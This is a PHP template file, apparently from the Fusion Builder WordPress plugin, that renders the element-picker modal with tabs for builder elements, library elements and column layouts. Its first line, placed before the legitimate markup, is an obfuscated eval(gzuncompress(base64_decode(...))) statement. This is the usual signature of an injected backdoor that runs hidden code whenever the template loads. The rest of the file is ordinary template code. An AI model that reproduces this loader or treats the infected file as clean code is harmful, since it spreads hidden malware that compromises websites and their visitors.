<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><script type="text/template" id="fusion-builder-modules-template">
	<div class="fusion-builder-modal-top-container">
		<h2 class="fusion-builder-settings-heading">
			{{ fusionBuilderText.select_element }}
			<input type="text" class="fusion-elements-filter" placeholder="{{ fusionBuilderText.search_elements }}" />
		</h2>

		<ul class="fusion-tabs-menu">
			<li class=""><a href="#default-elements">{{ fusionBuilderText.builder_elements }}</a></li>
			<# if ( FusionPageBuilderApp.shortcodeGenerator !== true ) { #>
				<li class=""><a href="#custom-elements">{{ fusionBuilderText.library_elements }}</a></li>
			<# } #>
			<# if ( FusionPageBuilderApp.shortcodeGenerator === true ) { #>
				<li class=""><a href="#default-columns">{{ fusionBuilderText.columns }}</a></li>
			<# } #>
			<# if ( FusionPageBuilderApp.innerColumn == 'false' && FusionPageBuilderApp.shortcodeGenerator !== true ) { #>
				<li class=""><a href="#inner-columns">{{ fusionBuilderText.inner_columns }}</a></li>
			<# } #>
		</ul>
	</div>

	<div class="fusion-builder-main-settings fusion-builder-main-settings-full has-group-options">
		<div class="fusion-builder-all-elements-container">
			<div class="fusion-tabs">
				<div id="default-elements" class="fusion-tab-content">
					<ul class="fusion-builder-all-modules">
						<# _.each( modules, function(module) { #>
							<li class="{{ module.label }} fusion-builder-element">
								<h4 class="fusion_module_title">
									<# if ( typeof( fusionAllElements[module.label].icon ) !== 'undefined' ) { #>
										<div class="fusion-module-icon {{ fusionAllElements[module.label].icon }}"></div>
									<# } #>
									{{ module.title }}
								</h4>
								<span class="fusion_module_label">{{ module.label }}</span>
							</li>
						<# } ); #>
					</ul>
				</div>
				<# if ( FusionPageBuilderApp.innerColumn == 'false' && FusionPageBuilderApp.shortcodeGenerator !== true ) { #>
					<div id="inner-columns" class="fusion-tab-content">
						<?php echo fusion_builder_inner_column_layouts(); // WPCS: XSS ok. ?>
					</div>
				<# } #>
				<# if ( FusionPageBuilderApp.shortcodeGenerator === true ) { #>
					<div id="default-columns" class="fusion-tab-content">
						<?php echo fusion_builder_generator_column_layouts(); // WPCS: XSS ok. ?>
					</div>
				<# } #>
				<div id="custom-elements" class="fusion-tab-content"></div>
			</div>
		</div>
	</div>

	<div class="fusion-builder-modal-bottom-container">
		<a href="#" class="fusion-builder-modal-close"><span>{{ fusionBuilderText.cancel }}</span></a>
	</div>
</script>
